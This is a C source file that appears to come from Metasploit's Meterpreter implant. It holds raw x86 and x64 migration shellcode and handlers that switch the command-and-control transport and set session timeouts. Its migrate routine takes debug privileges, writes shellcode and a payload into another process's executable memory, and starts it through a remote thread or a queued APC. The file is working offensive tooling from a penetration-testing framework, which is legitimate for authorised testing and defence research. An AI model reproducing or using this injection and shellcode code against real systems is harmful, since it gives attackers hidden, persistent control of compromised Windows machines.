#include "common.h"
#include "base_inject.h"

// see '/msf3/external/source/shellcode/windows/x86/src/migrate/migrate.asm'
BYTE migrate_stub_x86[] =	"\xFC\x8B\x74\x24\x04\x81\xEC\x00\x20\x00\x00\xE8\x89\x00\x00\x00"
							"\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B\x52\x0C\x8B\x52\x14\x8B"
							"\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0\xAC\x3C\x61\x7C\x02\x2C"
							"\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57\x8B\x52\x10\x8B\x42\x3C"
							"\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4A\x01\xD0\x50\x8B\x48\x18\x8B"
							"\x58\x20\x01\xD3\xE3\x3C\x49\x8B\x34\x8B\x01\xD6\x31\xFF\x31\xC0"
							"\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4\x03\x7D\xF8\x3B\x7D\x24"
							"\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B\x0C\x4B\x8B\x58\x1C\x01"
							"\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24\x5B\x5B\x61\x59\x5A\x51"
							"\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D\x68\x33\x32\x00\x00\x68"
							"\x77\x73\x32\x5F\x54\x68\x4C\x77\x26\x07\xFF\xD5\xB8\x90\x01\x00"
							"\x00\x29\xC4\x54\x50\x68\x29\x80\x6B\x00\xFF\xD5\x50\x50\x8D\x5E"
							"\x10\x53\x50\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF\xD5\x97\xFF"
							"\x36\x68\x1D\x9F\x26\x35\xFF\xD5\xFF\x56\x08";

// see '/msf3/external/source/shellcode/windows/x64/src/migrate/migrate.asm'
BYTE migrate_stub_x64[] =	"\xFC\x48\x89\xCE\x48\x81\xEC\x00\x20\x00\x00\x48\x83\xE4\xF0\xE8"
							"\xC8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xD2\x65\x48"
							"\x8B\x52\x60\x48\x8B\x52\x18\x48\x8B\x52\x20\x48\x8B\x72\x50\x48"
							"\x0F\xB7\x4A\x4A\x4D\x31\xC9\x48\x31\xC0\xAC\x3C\x61\x7C\x02\x2C"
							"\x20\x41\xC1\xC9\x0D\x41\x01\xC1\xE2\xED\x52\x41\x51\x48\x8B\x52"
							"\x20\x8B\x42\x3C\x48\x01\xD0\x66\x81\x78\x18\x0B\x02\x75\x72\x8B"
							"\x80\x88\x00\x00\x00\x48\x85\xC0\x74\x67\x48\x01\xD0\x50\x8B\x48"
							"\x18\x44\x8B\x40\x20\x49\x01\xD0\xE3\x56\x48\xFF\xC9\x41\x8B\x34"
							"\x88\x48\x01\xD6\x4D\x31\xC9\x48\x31\xC0\xAC\x41\xC1\xC9\x0D\x41"
							"\x01\xC1\x38\xE0\x75\xF1\x4C\x03\x4C\x24\x08\x45\x39\xD1\x75\xD8"
							"\x58\x44\x8B\x40\x24\x49\x01\xD0\x66\x41\x8B\x0C\x48\x44\x8B\x40"
							"\x1C\x49\x01\xD0\x41\x8B\x04\x88\x48\x01\xD0\x41\x58\x41\x58\x5E"
							"\x59\x5A\x41\x58\x41\x59\x41\x5A\x48\x83\xEC\x20\x41\x52\xFF\xE0"
							"\x58\x41\x59\x5A\x48\x8B\x12\xE9\x4F\xFF\xFF\xFF\x5D\x49\xBE\x77"
							"\x73\x32\x5F\x33\x32\x00\x00\x41\x56\x48\x89\xE1\x48\x81\xEC\xA0"
							"\x01\x00\x00\x49\x89\xE5\x48\x83\xEC\x28\x41\xBA\x4C\x77\x26\x07"
							"\xFF\xD5\x4C\x89\xEA\x6A\x02\x59\x41\xBA\x29\x80\x6B\x00\xFF\xD5"
							"\x4D\x31\xC0\x41\x50\x41\x50\x4C\x8D\x4E\x10\x6A\x01\x5A\x6A\x02"
							"\x59\x41\xBA\xEA\x0F\xDF\xE0\xFF\xD5\x48\x89\xC7\x48\x8B\x0E\x41"
							"\xBA\x1D\x9F\x26\x35\xFF\xD5\xFF\x56\x08";

// We force 64bit algnment for HANDLES and POINTERS in order 
// to be cross compatable between x86 and x64 migration.
typedef struct _MIGRATECONTEXT
{
 	union
	{
		HANDLE hEvent;
		BYTE bPadding1[8];
	} e;

	union
	{
 		LPVOID lpPayload;
		BYTE bPadding2[8];
	} p;

 	WSAPROTOCOL_INFO info;

} MIGRATECONTEXT, * LPMIGRATECONTEXT;

BOOL remote_request_core_transport_change(Remote* remote, Packet* packet, DWORD* pResult)
{
	DWORD result = ERROR_NOT_ENOUGH_MEMORY;
	Packet* response = packet_create_response(packet);
	UINT transportType = packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_TYPE);
	wchar_t* transportUrl = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_URL);

	TimeoutSettings timeouts;
	timeouts.expiry = (int)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_SESSION_EXP);
	timeouts.comms = (int)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_COMM_TIMEOUT);
	timeouts.retry_total = (DWORD)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_RETRY_TOTAL);
	timeouts.retry_wait = (DWORD)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_RETRY_WAIT);

	if (timeouts.expiry == 0)
	{
		timeouts.expiry = remote->transport->timeouts.expiry;
	}
	if (timeouts.comms == 0)
	{
		timeouts.comms = remote->transport->timeouts.comms;
	}
	if (timeouts.retry_total == 0)
	{
		timeouts.retry_total = remote->transport->timeouts.retry_total;
	}
	if (timeouts.retry_wait == 0)
	{
		timeouts.retry_wait = remote->transport->timeouts.retry_wait;
	}

	dprintf("[CHANGE TRANS] Type: %u", transportType);
	dprintf("[CHANGE TRANS] Url: %S", transportUrl);
	dprintf("[CHANGE TRANS] Expiration: %d", timeouts.expiry);
	dprintf("[CHANGE TRANS] Comms: %d", timeouts.comms);
	dprintf("[CHANGE TRANS] Retry Total: %u", timeouts.retry_total);
	dprintf("[CHANGE TRANS] Retry Wait: %u", timeouts.retry_wait);

	do
	{
		if (response == NULL || transportUrl == NULL)
		{
			dprintf("[CHANGE TRANS] Something was NULL");
			break;
		}

		if (transportType == METERPRETER_TRANSPORT_SSL)
		{
			remote->next_transport = remote->trans_create_tcp(transportUrl, &timeouts);
		}
		else
		{
			BOOL ssl = transportType == METERPRETER_TRANSPORT_HTTPS;
			wchar_t* ua = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_UA);
			wchar_t* proxy = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_PROXY_INFO);
			wchar_t* proxyUser = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_PROXY_USER);
			wchar_t* proxyPass = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_PROXY_PASS);
			PBYTE certHash = packet_get_tlv_value_raw(packet, TLV_TYPE_TRANS_CERT_HASH);

			remote->next_transport = remote->trans_create_http(ssl, transportUrl, ua, proxy,
				proxyUser, proxyPass, certHash, &timeouts);

			SAFE_FREE(ua);
			SAFE_FREE(proxy);
			SAFE_FREE(proxyUser);
			SAFE_FREE(proxyPass);
		}

		// tell the server dispatch to exit, it should pick up the new transport
		result = ERROR_SUCCESS;
	} while (0);

	if (packet)
	{
		packet_transmit_empty_response(remote, response, result);
	}

	SAFE_FREE(transportUrl);

	return result == ERROR_SUCCESS ? FALSE : TRUE;
}

/*!
 * @brief Set the current hash that is used for SSL certificate verification.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the request packet.
 * @returns Indication of success or failure.
 */
DWORD remote_request_core_transport_setcerthash(Remote* remote, Packet* packet)
{
	DWORD result = ERROR_SUCCESS;
	Packet* response;

	do
	{
		response = packet_create_response(packet);
		if (!response)
		{
			result = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		// no setting of the cert hash if the target isn't a HTTPS transport
		if (remote->transport->type != METERPRETER_TRANSPORT_HTTPS)
		{
			result = ERROR_BAD_ENVIRONMENT;
			break;
		}

		unsigned char* certHash = packet_get_tlv_value_raw(packet, TLV_TYPE_TRANS_CERT_HASH);
		HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;

		// Support adding a new cert hash if one doesn't exist
		if (!ctx->cert_hash)
		{
			if (certHash)
			{
				PBYTE newHash = (unsigned char*)malloc(sizeof(unsigned char)* CERT_HASH_SIZE);
				if (!newHash)
				{
					result = ERROR_NOT_ENOUGH_MEMORY;
					break;
				}

				memcpy(newHash, certHash, CERT_HASH_SIZE);

				// Set it at the last minute. Mucking with "globals" and all, want to make sure we
				// don't set it too early.. just in case.
				ctx->cert_hash = newHash;
			}
			else
			{
				// at this time, don't support overwriting of the existing hash
				// as that will cause issues!
				result = ERROR_BAD_ARGUMENTS;
				break;
			}
		}
		// support removal of the existing hash
		else
		{
			if (certHash)
			{
				result = ERROR_BAD_ARGUMENTS;
				break;
			}
			else
			{
				SAFE_FREE(ctx->cert_hash);
			}
		}

		result = ERROR_SUCCESS;
	} while (0);

	if (response)
	{
		packet_transmit_response(result, remote, response);
	}

	return result;
}

/*!
 * @brief Get the current hash that is used for SSL certificate verification.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the request packet.
 * @returns Indication of success or failure.
 */
DWORD remote_request_core_transport_getcerthash(Remote* remote, Packet* packet)
{
	DWORD result = ERROR_SUCCESS;
	Packet* response;

	do
	{
		response = packet_create_response(packet);
		if (!response)
		{
			result = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		// Rather than error out if the transport isn't HTTPS, we'll just return
		// an empty response. This prevents a horrible error appearing in the
		// MSF console
		if (remote->transport->type == METERPRETER_TRANSPORT_HTTPS)
		{
			HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;
			if (ctx->cert_hash)
			{
				packet_add_tlv_raw(response, TLV_TYPE_TRANS_CERT_HASH, ctx->cert_hash, CERT_HASH_SIZE);
			}
		}

		result = ERROR_SUCCESS;
	} while (0);

	if (response)
	{
		packet_transmit_response(result, remote, response);
	}

	return result;
}

/*!
 * @brief Migrate the meterpreter server from the current process into another process.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the request packet.
 * @param pResult Pointer to the memory that will receive the result.
 * @returns Indication of whether the server should continue processing or not.
 */
BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResult)
{
	DWORD dwResult = ERROR_SUCCESS;
	Packet * response = NULL;
	HANDLE hToken = NULL;
	HANDLE hProcess = NULL;
	HANDLE hEvent = NULL;
	BYTE * lpPayloadBuffer = NULL;
	LPVOID lpMigrateStub = NULL;
	LPVOID lpMemory = NULL;
	MIGRATECONTEXT ctx = { 0 };
	DWORD dwMigrateStubLength = 0;
	DWORD dwPayloadLength = 0;
	DWORD dwProcessID = 0;
	DWORD dwDestinationArch = 0;

	do
	{
		response = packet_create_response(packet);
		if (!response)
		{
			dwResult = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		// Get the process identifier to inject into
		dwProcessID = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_PID);

		// Get the target process architecture to inject into
		dwDestinationArch = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_ARCH);

		// Get the length of the payload buffer
		dwPayloadLength = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_LEN);

		// Receive the actual migration payload buffer
		lpPayloadBuffer = packet_get_tlv_value_string(packet, TLV_TYPE_MIGRATE_PAYLOAD);

		dprintf("[MIGRATE] Attempting to migrate. ProcessID=%d, Arch=%s, PayloadLength=%d", dwProcessID, (dwDestinationArch == 2 ? "x64" : "x86"), dwPayloadLength);

		// If we can, get SeDebugPrivilege...
		if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		{
			TOKEN_PRIVILEGES priv = { 0 };

			priv.PrivilegeCount = 1;
			priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

			if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
			{
				if (AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL));
				{
					dprintf("[MIGRATE] Got SeDebugPrivilege!");
				}
			}

			CloseHandle(hToken);
		}

		// Open the process so that we can migrate into it
		hProcess = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwProcessID);
		if (!hProcess)
		{
			BREAK_ON_ERROR("[MIGRATE] OpenProcess failed")
		}

		if (remote->transport->get_socket)
		{
			// Duplicate the socket for the target process if we are SSL based
			if (WSADuplicateSocket(remote->transport->get_socket(remote->transport), dwProcessID, &ctx.info) != NO_ERROR)
			{
				BREAK_ON_WSAERROR("[MIGRATE] WSADuplicateSocket failed")
			}
		}

		// Create a notification event that we'll use to know when it's safe to exit 
		// (once the socket has been referenced in the other process)
		hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
		if (!hEvent)
		{
			BREAK_ON_ERROR("[MIGRATE] CreateEvent failed")
		}

		// Duplicate the event handle for the target process
		if (!DuplicateHandle(GetCurrentProcess(), hEvent, hProcess, &ctx.e.hEvent, 0, TRUE, DUPLICATE_SAME_ACCESS))
		{
			BREAK_ON_ERROR("[MIGRATE] DuplicateHandle failed")
		}

		// Get the architecture specific process migration stub...
		if (dwDestinationArch == PROCESS_ARCH_X86)
		{
			lpMigrateStub = (LPVOID)&migrate_stub_x86;
			dwMigrateStubLength = sizeof(migrate_stub_x86);
		}
		else if (dwDestinationArch == PROCESS_ARCH_X64)
		{
			lpMigrateStub = (LPVOID)&migrate_stub_x64;
			dwMigrateStubLength = sizeof(migrate_stub_x64);
		}
		else
		{
			SetLastError(ERROR_BAD_ENVIRONMENT);
			BREAK_ON_ERROR("[MIGRATE] Invalid target architecture")
		}

		// Allocate memory for the migrate stub, context and payload
		lpMemory = VirtualAllocEx(hProcess, NULL, dwMigrateStubLength + sizeof(MIGRATECONTEXT)+dwPayloadLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (!lpMemory)
		{
			BREAK_ON_ERROR("[MIGRATE] VirtualAllocEx failed")
		}

		// Calculate the address of the payload...
		ctx.p.lpPayload = ((BYTE *)lpMemory + dwMigrateStubLength + sizeof(MIGRATECONTEXT));

		// Write the migrate stub to memory...
		if (!WriteProcessMemory(hProcess, lpMemory, lpMigrateStub, dwMigrateStubLength, NULL))
		{
			BREAK_ON_ERROR("[MIGRATE] WriteProcessMemory 1 failed")
		}

		// Write the migrate context to memory...
		if (!WriteProcessMemory(hProcess, ((BYTE *)lpMemory + dwMigrateStubLength), &ctx, sizeof(MIGRATECONTEXT), NULL))
		{
			BREAK_ON_ERROR("[MIGRATE] WriteProcessMemory 2 failed")
		}

		// Write the migrate payload to memory...
		if (!WriteProcessMemory(hProcess, ctx.p.lpPayload, lpPayloadBuffer, dwPayloadLength, NULL))
		{
			BREAK_ON_ERROR("[MIGRATE] WriteProcessMemory 3 failed")
		}

		// First we try to migrate by directly creating a remote thread in the target process
		if (inject_via_remotethread(remote, response, hProcess, dwDestinationArch, lpMemory, ((BYTE*)lpMemory + dwMigrateStubLength)) != ERROR_SUCCESS)
		{
			dprintf("[MIGRATE] inject_via_remotethread failed, trying inject_via_apcthread...");

			// If that fails we can try to migrate via a queued APC in the target process
			if (inject_via_apcthread(remote, response, hProcess, dwProcessID, dwDestinationArch, lpMemory, ((BYTE*)lpMemory + dwMigrateStubLength)) != ERROR_SUCCESS)
			{
				BREAK_ON_ERROR("[MIGRATE] inject_via_apcthread failed")
			}
		}

		dwResult = ERROR_SUCCESS;

	} while (0);

	// If we failed and have not sent the response, do so now
	if (dwResult != ERROR_SUCCESS && response)
	{
		packet_transmit_response(dwResult, remote, response);
	}

	// Cleanup...
	if (hProcess)
	{
		CloseHandle(hProcess);
	}

	if (hEvent)
	{
		CloseHandle(hEvent);
	}

	if (pResult)
	{
		*pResult = dwResult;
	}

	// if migration succeeded, return 'FALSE' to indicate server thread termination.
	return ERROR_SUCCESS == dwResult ? FALSE : TRUE;
}

/*!
 * @brief Update the timeouts with the given values
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the request packet.
 * @returns Indication of success or failure.
 * @remark If no values are given, no updates are made. The response to
           this message is the new/current settings.
 */
DWORD remote_request_transport_set_timeouts(Remote * remote, Packet * packet)
{
	DWORD result = ERROR_SUCCESS;
	Packet* response = NULL;

	do
	{
		response = packet_create_response(packet);
		if (!response)
		{
			result = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		int expirationTimeout = (int)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_SESSION_EXP);
		int commsTimeout = (int)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_COMM_TIMEOUT);
		DWORD retryTotal = (DWORD)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_RETRY_TOTAL);
		DWORD retryWait = (DWORD)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_RETRY_WAIT);

		// TODO: put this in a helper function that can be used everywhere?

		// if it's in the past, that's fine, but 0 implies not set
		if (expirationTimeout != 0)
		{
			dprintf("[DISPATCH TIMEOUT] setting expiration time to %d", expirationTimeout);
			remote->transport->timeouts.expiry = expirationTimeout;
			remote->transport->expiration_end = expirationTimeout + current_unix_timestamp();
		}

		if (commsTimeout != 0)
		{
			dprintf("[DISPATCH TIMEOUT] setting comms timeout to %d", commsTimeout);
			remote->transport->timeouts.comms = commsTimeout;
			remote->transport->comms_last_packet = current_unix_timestamp();
		}

		if (retryTotal > 0)
		{
			dprintf("[DISPATCH TIMEOUT] setting retry total to %u", retryTotal);
			remote->transport->timeouts.retry_total = retryTotal;
		}

		if (retryWait > 0)
		{
			dprintf("[DISPATCH TIMEOUT] setting retry wait to %u", retryWait);
			remote->transport->timeouts.retry_wait = retryWait;
		}

		// for the session expiry, return how many seconds are left before the session actually expires
		packet_add_tlv_uint(response, TLV_TYPE_TRANS_SESSION_EXP, remote->transport->expiration_end - current_unix_timestamp());
		packet_add_tlv_uint(response, TLV_TYPE_TRANS_COMM_TIMEOUT, remote->transport->timeouts.comms);
		packet_add_tlv_uint(response, TLV_TYPE_TRANS_RETRY_TOTAL, remote->transport->timeouts.retry_total);
		packet_add_tlv_uint(response, TLV_TYPE_TRANS_RETRY_WAIT, remote->transport->timeouts.retry_wait);

	} while (0);

	if (response)
	{
		packet_transmit_response(result, remote, response);
	}

	return result;
}
